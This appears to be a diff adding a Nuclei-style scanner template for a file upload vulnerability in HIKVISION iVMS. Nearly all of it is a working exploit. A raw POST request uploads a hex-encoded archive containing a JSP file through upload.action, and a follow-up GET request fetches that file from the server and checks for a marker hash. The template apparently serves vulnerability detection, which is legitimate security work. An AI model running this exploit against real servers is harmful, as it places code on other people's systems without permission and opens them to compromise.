@@ -1,0 +1,40 @@
+id: hikvision-ivms-upload-action-file-upload
+info:
+  name: HIKVISION iVMS upload.action File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    HIKVISION iVMS upload.action has an arbitrary file upload vulnerability. Attackers can bypass permissions by constructing a malicious IPA installation package containing directory traversal, thus obtaining server privileges.
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /msp/home/upload.action;getPic?&type=ios HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MicroMessenger
+        Content-Type: multipart/form-data; boundary=--------884337038
+
+        ----------884337038
+        Content-Disposition: form-data; name="file";filename="{{rand_base(6)}}.ipa"
+
+        {{hex_decode("504B030414000000080014B1305676B81B6CA8000000C40000000A0000006A7370706F632E6A73701D8ECD0A824014465F25046166338B88365690684170ED47296A37E855A7A6D174D49AA76F7477CEB7387C2BB7EA34AB1BA1B45444E1308BB59562C2B653EC2DDA94F9DB385C2E024CAB0C1B42593691DFE5B955E79184F32839FF2009BFB03F9410C0704C64093718C0BC0C98D4DCCD554401AC1D4AA937B69FBCE74C546C2724125ED752A45C8B4AB102F505B93C715D92063F1DB67ADC626C7A897A9A6DC35EB086847AEEE60F504B0102140014000000080014B1305676B81B6CA8000000C40000000A00000000000000010000000000000000006A7370706F632E6A7370504B0506000000000100010038000000D00000000000")}}
+        ----------884337038--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+  - raw:
+      - |
+        GET /msp/upload/ios/{{rand_base(6)}}/jsppoc.jsp;getPic HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
